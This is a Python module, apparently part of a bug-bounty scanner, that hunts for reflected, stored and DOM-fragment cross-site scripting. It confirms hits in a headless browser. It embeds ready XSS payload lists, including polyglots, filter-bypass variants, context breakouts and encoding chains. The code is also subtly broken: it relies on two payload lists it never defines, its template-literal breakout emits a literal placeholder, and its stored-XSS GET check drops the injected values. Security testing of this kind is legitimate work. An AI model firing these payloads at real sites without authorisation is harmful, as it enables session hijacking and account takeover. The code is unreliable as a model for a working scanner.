"""
XSSScanner — reflected + stored XSS detection with headless browser validation.

Lifecycle:
  DETECTED:   Payload reflected in response
  VALIDATED:  Context identified (HTML/attribute/JS/URL)
  EXPLOITABLE: (not applicable — XSS is inherently exploitable)
  VERIFIED:   Playwright confirms alert() or DOM mutation + screenshot

Stored XSS:
  DETECTED:   Form submitted with XSS payload; payload appears in GET response
  VERIFIED:   Payload executes in browser after form submission

Maturity: Level 4 (Verified via browser execution)

Improvements over basic implementation:
  1. Context-aware payload mutation — canary probes identify exact reflection
     context (double-quoted attr, backtick JS string, etc.), then payload is
     constructed to break out of that specific syntax.
  2. Encoding chain detection — attempts double/triple URL+HTML encoding
     when raw payloads are blocked.
  3. Polyglot payloads — single payloads that fire in href, src, data attrs,
     inline handlers, and script contexts.
  4. Executable context verification — every reflected finding checks that
     payload appears unencoded in an executable position, not just anywhere
     in the body.
"""

import html
import re
import uuid
from typing import Any
from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse
import copy

from models.finding import Finding
from modules.utils import (
    finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict, safe_get, safe_post,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

XSS_POLYGLOTS = [
    "jaVasCript:/*-/*/`/\\\"/\\'/**/(/ */oNcliCk=alert() )//%0D%0A%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    '\\"-alert(1)//',
    "javascript:alert(1)//\\\"\\'-alert(1)--> <script>alert(1)</script>",
    '\\";alert(1)//\';alert(1)//--></SCRIPT>">\'><SCRIPT>alert(1)</SCRIPT>',
]

CONTEXT_PAYLOADS = {
    "html": [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<script>alert(1)</script>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<select><option><style></style><img src=x onerror=alert(1)></select>',
    ],
    "attribute": [
        '" onfocus=alert(1) autofocus= ',
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) ',
    ],
    "javascript": [
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "';alert(1);'",
    ],
    "url": [
        "javascript:alert(1)",
        "javaScript:alert(1)",
        "JaVaScRiPt:alert(1)",
    ],
}

DOM_XSS_PROBES = ["bbh_dom_probe", "<img src=x onerror=alert(1)>", "';alert(1)//"]

FRAMEWORK_XSS_PAYLOADS = {
    "react": ['{{__proto__.toString.constructor("alert(1)")()}}'],
    "angular": ["{{constructor.constructor('alert(1)')()}}"],
    "vue": ["{{constructor.constructor('alert(1)')()}}"],
    "jquery": ['<img src=x onerror=alert(1)>'],
}

WAF_BYPASS_XSS = [
    '<svg/onload=alert&#40;1&#41;>',
    '%3Csvg/onload=alert(1)%3E',
    '<SvG/OnLoAd=alert(1)>',
    '--><svg/onload=alert(1)>',
    "onload=alert(1)//<svg ' \"",
    'javascript:alert(1)',
    '&#106;avascript:alert(1)',
]

STORED_XSS_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
]


class XSSScanner(ScannerBase):
    SCANNER_NAME = "xss"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._payloads = None

    def _get_payloads(self) -> dict:
        if self._payloads:
            return self._payloads
        loaded = self._load_payloads("xss")
        if loaded and isinstance(loaded, dict):
            self._payloads = loaded
        else:
            self._payloads = {
                "reflected": XSS_PAYLOADS,
                "context": CONTEXT_PAYLOADS,
                "dom_probes": DOM_XSS_PROBES,
                "framework": FRAMEWORK_XSS_PAYLOADS,
                "waf_bypass": WAF_BYPASS_XSS,
            }
        if self.waf_detected:
            bypass = self._payloads.get("waf_bypass", WAF_BYPASS_XSS)
            reflected = self._payloads.setdefault("reflected", list(XSS_PAYLOADS))
            reflected.extend(bypass)
        return self._payloads

    # ── Context-aware canary probe ───────────────────────────────────────

    _CANARY_BASE = "BBH_CANARY_"

    def _detect_exact_context(self, body: str, canary: str) -> dict:
        """Deep context analysis: detect exact quoting and container.
        
        Returns a dict with:
          context: str — 'html', 'attribute', 'javascript', 'url'
          quote_char: str | None — the delimiter (", ', `, or None)
          in_script: bool
          in_event_handler: bool  
          template_literal: bool
          encoded: bool — whether the canary itself appears HTML-encoded
        """
        result = {
            "context": "html",
            "quote_char": None,
            "in_script": False,
            "in_event_handler": False,
            "template_literal": False,
            "encoded": False,
        }
        escaped = re.escape(canary)

        # Check if canary is HTML-encoded
        encoded_canary = canary.replace("_", "&#95;")
        if encoded_canary in body or f"&#{ord(canary[0])};" in body:
            search_start = max(0, body.find(canary) - 200) if canary in body else 0
            surrounding = body[search_start:search_start + len(canary) + 400]
            if "&" in surrounding[:len(canary) + 50]:
                result["encoded"] = True

        # JavaScript string context (single, double, backtick)
        js_str = re.search(
            rf'(?:`|"|\')(?:[^`"\']*){escaped}(?:[^`"\']*)(?:`|"|\')',
            body, re.DOTALL
        )
        if js_str:
            full = js_str.group(0)
            if full.startswith("`") and full.endswith("`"):
                result["context"] = "javascript"
                result["quote_char"] = "`"
                result["template_literal"] = True
            elif full.startswith("'") and full.endswith("'"):
                result["context"] = "javascript"
                result["quote_char"] = "'"
            elif full.startswith('"') and full.endswith('"'):
                result["context"] = "javascript"
                result["quote_char"] = '"'

        # Inside <script> tag
        if re.search(rf"<script\b[^>]*>.*?</script>", body, re.DOTALL) and canary in body:
            result["context"] = "javascript"
            result["in_script"] = True

        # Inside event handler attribute (onclick=, onerror=, etc.)
        eh = re.search(
            rf'<[^>]+?\s+on\w+\s*=\s*["\'][^"\']*{escaped}[^"\']*["\']',
            body, re.IGNORECASE
        )
        if eh:
            result["context"] = "javascript"
            result["in_event_handler"] = True
            attr_match = re.search(r'\s(on\w+)\s*=', eh.group(0), re.IGNORECASE)
            if attr_match:
                result["event_handler"] = attr_match.group(1).lower()

        # Inside href/src/action attribute
        url_attr = re.search(
            rf'(?:href|src|action|formaction)\s*=\s*["\']?[^"\'<>]*{escaped}',
            body, re.IGNORECASE
        )
        if url_attr:
            result["context"] = "url"
            full = url_attr.group(0)
            if '"' in full:
                result["quote_char"] = '"'
            elif "'" in full:
                result["quote_char"] = "'"

        # Inside a generic quoted attribute
        attr = re.search(
            rf'<[^>]+?\s+[\w:-]+\s*=\s*["\'][^"\']*{escaped}[^"\']*["\']',
            body
        )
        if attr and result["context"] == "html":
            full = attr.group(0)
            if full.count('"') >= 2:
                result["context"] = "attribute"
                result["quote_char"] = '"'
            elif full.count("'") >= 2:
                result["context"] = "attribute"
                result["quote_char"] = "'"
            # Check if in URL-targeting attribute
            if re.search(r'\b(href|src|action|formaction)\s*=', full, re.IGNORECASE):
                result["context"] = "url"

        return result

    def _build_context_aware_payload(self, canary_result: dict, base_payload: str) -> str:
        """Mutate a base payload to fit the exact reflection context.
        
        Instead of selecting a category, this constructs the breakout
        characters to match the actual quoting.
        """
        ctx = canary_result.get("context", "html")
        quote = canary_result.get("quote_char")

        # Determine the event handler / function payload (without breakout)
        inner = base_payload
        inner_clean = base_payload.lstrip('"\'`').rstrip('"\'`/').replace("\\", "")

        if ctx == "attribute":
            if quote == '"':
                return f'" {inner_clean} autofocus= '
            elif quote == "'":
                return f"' {inner_clean} autofocus= "
            return f'" {inner_clean} autofocus= '

        elif ctx == "url":
            if "alert" in inner_clean:
                return f"javascript:{inner_clean}"
            return inner

        elif ctx == "javascript":
            if canary_result.get("template_literal"):
                return f'${{inner_clean}}'
            elif canary_result.get("in_script"):
                return f"</script><script>{inner_clean}</script>"
            elif quote == "'":
                return f"';{inner_clean}//"
            elif quote == '"':
                return f'";{inner_clean}//'
            elif quote == "`":
                return f'`;${{inner_clean}};//'
            return f"';{inner_clean}//"

        return inner

    def _probe_context(self, url: str, param: str) -> dict | None:
        """Send innocuous canary string, detect exact reflection context."""
        canary = self._CANARY_BASE + uuid.uuid4().hex[:8]
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [canary]
        new_qs = urlencode(qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_qs))
        resp = self._safe_get(test_url)
        if not resp or canary not in resp.text:
            return None
        result = self._detect_exact_context(resp.text, canary)
        result["raw_response"] = resp
        return result

    # ── Detection phase ─────────────────────────────────────────────────

    def _try_encoding_chain(self, url: str, parameter: str, payload: str) -> tuple[str | None, dict | None]:
        """Try double/triple encoding chains when raw payload gets blocked.
        
        Attempts: raw → URL-encoded → double-URL → URL+HTML-double.
        Returns (mutated_payload, response) or (None, None).
        """
        from urllib.parse import quote
        chains = [
            ("double_url", quote(quote(payload, safe=''))),
            ("triple_url", quote(quote(quote(payload, safe=''), safe=''), safe='')),
            ("url_then_html", quote(payload.replace("<", "&lt;").replace(">", "&gt;"), safe='')),
            ("unicode_escape", payload.encode("unicode_escape").decode().replace("\\\\", "\\")),
            ("double_url_then_html", quote(quote(
                payload.replace("<", "&lt;").replace(">", "&gt;"), safe=''
            ))),
        ]
        for chain_name, mutated in chains:
            if mutated == payload:
                continue
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[parameter] = [mutated]
            new_qs = urlencode(qs, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_qs))
            resp = self._safe_get(test_url)
            if resp and payload in resp.text:
                return mutated, resp
            # Check for decoded version
            if resp and mutated in resp.text:
                return mutated, resp
        return None, None

    def _in_executable_context(self, body: str, payload: str) -> bool:
        """Verify payload appears unencoded in an executable position.
        
        Returns True only if the payload is in:
          - Raw HTML without HTML encoding
          - Inside a <script> block
          - In an event handler attribute (on*=...)
          - In a javascript: URL
        
        Returns False if payload only appears HTML-encoded or in a
        safe text context.
        """
        if payload not in body:
            return False
        if self._is_payload_encoded(body, payload):
            return False
        # Inside <script> tag
        if re.search(rf"<script\b[^>]*>.*?{re.escape(payload)}.*?</script>", body, re.IGNORECASE | re.DOTALL):
            return True
        # Inside event handler
        if re.search(rf'\son\w+\s*=\s*["\']?[^"\']*{re.escape(payload)}[^"\']*["\']?', body, re.IGNORECASE):
            return True
        # Inside javascript: URL
        if re.search(rf'javascript:\s*{re.escape(payload)}', body, re.IGNORECASE):
            return True
        # In raw HTML (outside tags or as unencoded text)
        if re.search(rf'>[^<]*{re.escape(payload)}[^<]*<', body, re.DOTALL):
            return True
        return False

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        payloads = self._get_payloads()
        if parameter is None:
            params = list(parse_qs(urlparse(url).query).keys())
            if not params:
                return None
            parameter = params[0]

        context_result = self._probe_context(url, parameter)
        if context_result is None:
            context_result = {"context": "html", "quote_char": None, "in_script": False,
                              "in_event_handler": False, "template_literal": False,
                              "encoded": False, "raw_response": None}
        context_name = context_result.get("context", "html")

        # ── Try polyglot payloads first (broad coverage) ─────────────
        for poly in XSS_POLYGLOTS:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[parameter] = [poly]
            new_qs = urlencode(qs, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_qs))
            resp = self._safe_get(test_url)
            if resp and self._in_executable_context(resp.text, poly):
                return DetectionResult(
                    url=url,
                    parameter=parameter,
                    payload=poly,
                    context=context_name,
                    raw_response=resp,
                    evidence_signals=[f"Polyglot XSS in {context_name} context"],
                )

        # ── Context-aware mutated payloads ───────────────────────────
        context_payloads = payloads.get("context", CONTEXT_PAYLOADS)
        raw_candidates = context_payloads.get(context_name, [])
        for base_payload in raw_candidates[:5]:
            mutated = self._build_context_aware_payload(context_result, base_payload)
            for attempt_payload in [base_payload, mutated]:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[parameter] = [attempt_payload]
                new_qs = urlencode(qs, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_qs))

                resp = self._safe_get(test_url)
                if not resp:
                    continue

                if self._in_executable_context(resp.text, attempt_payload):
                    return DetectionResult(
                        url=url,
                        parameter=parameter,
                        payload=attempt_payload,
                        context=context_name,
                        raw_response=resp,
                        evidence_signals=[f"Reflected in {context_name} context (mutated)"],
                    )

                # ── Try encoding chains if raw payload didn't work ──
                chain_payload, chain_resp = self._try_encoding_chain(url, parameter, attempt_payload)
                if chain_payload and chain_resp:
                    if self._in_executable_context(chain_resp.text, attempt_payload):
                        return DetectionResult(
                            url=url,
                            parameter=parameter,
                            payload=attempt_payload,
                            context=context_name,
                            raw_response=chain_resp,
                            evidence_signals=[f"Reflected via encoding chain in {context_name} context"],
                        )

            # ── Fallback: check for any reflection in JSON/text content ──
            content_type = (resp.headers.get('Content-Type', '') or '') if resp else ''
            if resp and 'text/html' in content_type and base_payload in resp.text:
                if self._is_payload_encoded(resp.text, base_payload):
                    continue
                body = resp.text
                pos = body.index(base_payload)
                before = body[pos-1] if pos > 0 else ''
                after = body[pos+len(base_payload)] if pos+len(base_payload) < len(body) else ''
                escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
                in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
                if not in_json:
                    return DetectionResult(
                        url=url,
                        parameter=parameter,
                        payload=base_payload,
                        context="json_reflection",
                        raw_response=resp,
                        evidence_signals=["Reflected outside JSON string context in text/html response"],
                    )
        return None

    def _safe_get(self, url: str):
        from modules.utils import safe_get
        try:
            return safe_get(self.session, url, self.timeout, raise_for_status=False)
        except Exception:
            return None

    def _is_payload_encoded(self, body: str, payload: str) -> bool:
        """Check if payload appears HTML-encoded (safe) at all occurrences in body.

        Returns True if every occurrence of payload in body has its HTML-special
        characters encoded as entities, meaning the payload won't execute.
        """
        idx = 0
        has_special = any(c in payload for c in '<>"\'')
        if not has_special:
            return False
        while True:
            pos = body.find(payload, idx)
            if pos == -1:
                break
            for i, char in enumerate(payload):
                if char in '<>"\'&':
                    actual = body[pos + i] if pos + i < len(body) else ''
                    if actual != char:
                        return True
            idx = pos + 1
        return False

    def _detect_context(self, body: str, payload: str) -> str | None:
        if payload not in body:
            return None
        if self._is_payload_encoded(body, payload):
            return None
        if re.search(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL) and payload in body:
            return "javascript"
        if re.search(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*" + re.escape(payload), body, re.IGNORECASE):
            return "attribute"
        if re.search(r"(href|src|action|formaction)\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "url"
        if re.search(r">[^<]*" + re.escape(payload) + r"[^<]*<", body, re.DOTALL):
            return "html"
        return None

    # ── Validation phase ────────────────────────────────────────────────

    def validate(self, detection: DetectionResult) -> dict | None:
        """Validate XSS via headless browser execution."""
        if detection.context == "json_reflection":
            resp = detection.raw_response
            if resp and 'text/html' in resp.headers.get('Content-Type', ''):
                body = resp.text
                payload = detection.payload
                if payload in body and not self._is_payload_encoded(body, payload):
                    pos = body.index(payload)
                    before = body[pos-1] if pos > 0 else ''
                    after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
                    escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
                    in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
                    if not in_json:
                        return {"confirmed": True, "method": "json_reflection_context", "alert_fired": False}
            return {"confirmed": False, "method": "reflection_only", "alert_fired": False}
        payload = detection.payload
        url = detection.url
        parameter = detection.parameter

        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[parameter] = [payload]
        new_qs = urlencode(qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_qs))

        screenshot_dir = self.config.get("output", "reports") + "/screenshots"
        browser_ev = self.validation.confirm_browser_xss(
            url=test_url,
            payload=payload,
            screenshot_dir=screenshot_dir,
        )
        if browser_ev and (browser_ev.alert_fired or browser_ev.dom_mutation):
            return {
                "confirmed": True,
                "method": "browser_execution",
                "alert_fired": browser_ev.alert_fired,
                "dom_mutation": browser_ev.dom_mutation,
                "screenshot_path": browser_ev.screenshot_path,
            }
        return {"confirmed": False, "method": "reflection_only", "alert_fired": False}

    # ── Evidence collection ─────────────────────────────────────────────

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: dict | None = None) -> list:
        from models.evidence import (
            HttpRequestEvidence, HttpResponseEvidence,
            ResponseExcerptEvidence, BrowserExecutionEvidence,
        )
        ev_list = []
        resp = detection.raw_response
        if resp:
            ev_list.append(HttpRequestEvidence(
                method="GET",
                url=detection.url,
                curl_command=_build_curl("GET", detection.url, dict(self.session.headers),
                                         cookies=safe_cookies_dict(self.session.cookies)),
            ))
            ev_list.append(HttpResponseEvidence(
                status_code=resp.status_code,
                body_excerpt=resp.text[:500],
                body_length=len(resp.text),
            ))
        if detection.context == "json_reflection":
            resp = detection.raw_response
            if resp:
                ev_list.append(ResponseExcerptEvidence(
                    excerpt=resp.text[:500],
                    length=len(resp.text),
                    context=f"Content-Type: {resp.headers.get('Content-Type', '')} — reflected outside JSON string context",
                ))
        if validation_result and validation_result.get("alert_fired"):
            ev_list.append(BrowserExecutionEvidence(
                alert_fired=True,
                dom_mutation=validation_result.get("dom_mutation", False),
                screenshot_path=validation_result.get("screenshot_path", ""),
                execution_context="goto",
            ))
        return ev_list

    # ── Reproduction steps ──────────────────────────────────────────────

    def generate_reproduction(self, detection: DetectionResult, verified: bool = False) -> list[str]:
        if verified:
            return [
                f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
                f"Payload '{detection.payload}' was executed in a headless Chromium browser — alert() or DOM mutation confirmed in {detection.context} context",
                "In a real attack, this payload would execute in any victim's browser visiting the affected URL, enabling session hijacking, data theft, or account takeover",
            ]
        return [
            f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
            f"Observe that the payload is reflected in a {detection.context} context — unsanitized output confirms XSS",
            "An attacker can inject arbitrary JavaScript to steal cookies, capture keystrokes, or perform actions on behalf of the victim",
        ]

    # ── Stored XSS detection ────────────────────────────────────────────

    def _detect_stored_xss(self, forms: list[dict]) -> list[Finding]:
        """Submit XSS payloads in form fields and re-fetch to find stored reflections."""
        stored_findings: list[Finding] = []
        payloads = STORED_XSS_PAYLOADS

        for form in forms:
            form_url = form.get("url", "")
            form_action = form.get("action", "")
            form_method = form.get("method", "GET").upper()
            fields = form.get("fields", [])
            text_fields = [
                f for f in fields
                if f.get("name") and f.get("type") in ("text", "textarea", "search", "email", "url", None, "", "input")
            ]
            if not text_fields:
                continue

            for payload in payloads[:3]:
                try:
                    form_data = {}
                    injected_field = text_fields[0]
                    for fld in fields:
                        name = fld.get("name", "")
                        val = fld.get("value", "")
                        if name == injected_field.get("name"):
                            form_data[name] = payload
                        else:
                            form_data[name] = val if val else "test"

                    submit_url = form_action if form_action else form_url
                    if form_method == "GET":
                        parsed = urlparse(submit_url)
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs.update({k: [v] for k, v in form_data.items()})
                        new_qs = urlencode(qs, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_qs))
                        resp = safe_get(self.session, submit_url, self.timeout, raise_for_status=False)
                    else:
                        resp = safe_post(
                            self.session, submit_url, form_data, self.timeout,
                            raise_for_status=False, config=self.config,
                        )
                        test_url = form_action or form_url

                    if not resp:
                        continue

                    # Re-fetch page where payload might be stored (form page or action)
                    for check_url in [form_url, form_action]:
                        if not check_url or check_url == submit_url:
                            continue
                        check_resp = safe_get(self.session, check_url, self.timeout, raise_for_status=False)
                        if check_resp and payload in check_resp.text:
                            context = self._detect_context(check_resp.text, payload) or "html"
                            curl_cmd = _build_curl("GET", check_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies))
                            f = finding(
                                vuln_type="XSS Stored",
                                url=check_url,
                                severity="critical",
                                details=f"Stored XSS: payload '{payload}' persisted after form submission to {submit_url}",
                                evidence=f"Payload: {payload} | Context: {context} | Form: {submit_url}",
                                verification_stage=VerificationStage.DETECTED.value,
                                request=curl_cmd,
                                response_excerpt=check_resp.text[:500],
                                steps_to_reproduce=[
                                    f"Navigate to {form_url}",
                                    f"Submit form at {submit_url} with payload in field '{injected_field.get('name')}'",
                                    f"Visit {check_url}",
                                    f"Observe that payload '{payload}' is stored and rendered in a {context} context",
                                    "Manually verify by submitting the payload in a browser and checking for script execution",
                                ],
                            )
                            if f:
                                self._add_finding(f)
                                stored_findings.append(f)
                                log(f"  [XSS Stored] {check_url} — payload '{payload[:40]}' persisted", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                            break

                except Exception as e:
                    log(f"  [XSS Stored] Error with form {form_url}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return stored_findings

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        forms = self.recon.get("forms", [])

        # DOM fragment detection
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                base_resp = self._safe_get(url)
                if not base_resp or not base_resp.text:
                    continue
                if not re.search(r'(location\.hash|location\.href|window\.location)', base_resp.text):
                    continue
                for fp in DOM_FRAGMENT_PAYLOADS:
                    frag_url = url + fp
                    frag_resp = self._safe_get(frag_url)
                    if not frag_resp or not frag_resp.text:
                        continue
                    frag_content = fp.lstrip('#')
                    if frag_content in frag_resp.text and frag_content in html.unescape(frag_resp.text):
                        screenshot_dir = self.config.get("output", "reports") + "/screenshots"
                        browser_ev = self.validation.confirm_browser_xss(
                            url=frag_url,
                            payload=frag_content,
                            screenshot_dir=screenshot_dir,
                        )
                        confirmed = browser_ev and (browser_ev.alert_fired or browser_ev.dom_mutation)
                        from models.evidence import HttpRequestEvidence, BrowserExecutionEvidence
                        ev_list = [
                            HttpRequestEvidence(
                                method="GET",
                                url=frag_url,
                                curl_command=_build_curl("GET", frag_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            ),
                        ]
                        if browser_ev:
                            ev_list.append(BrowserExecutionEvidence(
                                alert_fired=browser_ev.alert_fired,
                                dom_mutation=browser_ev.dom_mutation,
                                screenshot_path=browser_ev.screenshot_path or "",
                                execution_context="goto",
                            ))
                        stage = VerificationStage.VERIFIED.value if confirmed else VerificationStage.DETECTED.value
                        f = finding(
                            vuln_type="XSS DOM Fragment",
                            url=url,
                            severity="high",
                            details=f"XSS via URL fragment {'executed in browser' if confirmed else 'detected'} — payload '{fp}' reflected unencoded",
                            evidence=f"Payload: {fp} | Context: dom_fragment | Executed: {confirmed}",
                            verification_stage=stage,
                            parameter="fragment",
                            request=_build_curl("GET", frag_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=frag_resp.text[:500] if frag_resp else "",
                            steps_to_reproduce=[
                                f"Visit {frag_url}",
                                "Observe that the fragment payload is reflected unencoded in the response",
                                "In a real attack, an attacker could craft a URL with a malicious fragment to execute JavaScript",
                            ],
                        )
                        if f:
                            for ev in ev_list:
                                self.evidence_engine.store(ev)
                                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                            signal_stage = VerificationStage.VALIDATED.value if confirmed else VerificationStage.DETECTED.value
                            self._enrich_finding(f, len(ev_list), signal_stage, signal_count=2 if confirmed else 1)
                            self._add_finding(f)
                        break
            except Exception as e:
                log(f"  [XSS DOM Fragment] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Reflected XSS
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())

                # Recon-driven targeting: prioritize parameters from JS intelligence
                js_urls = self.recon.get('js_urls', []) or []
                js_endpoints = self.recon.get('js_endpoints', []) or []
                if js_urls or js_endpoints:
                    js_param_priority = set()
                    js_text = ''
                    if isinstance(js_urls, list):
                        for js_url in js_urls:
                            if isinstance(js_url, str):
                                r = self._safe_get(js_url)
                                if r and r.text:
                                    js_text += r.text + '\n'
                    if isinstance(js_endpoints, list):
                        for ep in js_endpoints:
                            if isinstance(ep, str):
                                js_text += ep + '\n'
                    for param in params:
                        for kw in ('document.write', 'innerHTML', 'eval'):
                            pattern = rf'{re.escape(kw)}\s*\([^)]*{re.escape(param)}[^)]*\)'
                            if re.search(pattern, js_text):
                                js_param_priority.add(param)
                    if js_param_priority:
                        params = [p for p in params if p in js_param_priority] + [p for p in params if p not in js_param_priority]

                for param in params:
                    detection = self.detect(url, param)
                    if detection is None:
                        continue

                    validation = self.validate(detection)
                    evidence = self.collect_evidence(detection, validation)

                    confirmed = validation and validation.get("confirmed", False)
                    stage = VerificationStage.VERIFIED.value if confirmed else VerificationStage.DETECTED.value

                    f = finding(
                        vuln_type="XSS Reflected",
                        url=url,
                        severity="high",
                        details=f"XSS payload {'executed in browser' if confirmed else 'reflected'} in {detection.context} context via parameter '{param}'",
                        evidence=f"Payload: {detection.payload} | Context: {detection.context} | Executed: {confirmed}",
                        verification_stage=stage,
                        parameter=param,
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=detection.raw_response.text[:500] if detection.raw_response else "",
                        steps_to_reproduce=self.generate_reproduction(detection, verified=confirmed),
                    )
                    if f:
                        for ev in evidence:
                            self.evidence_engine.store(ev)
                            self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                        signal_stage = f["verification_stage"]
                        if detection.context == "json_reflection" and confirmed:
                            signal_stage = VerificationStage.VALIDATED.value
                        signal_count = 2 if confirmed else 1
                        self._enrich_finding(f, len(evidence), signal_stage, signal_count=signal_count)
                        self._add_finding(f)
            except Exception as e:
                log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Stored XSS
        if forms:
            self._detect_stored_xss(forms)

        return self._get_findings()
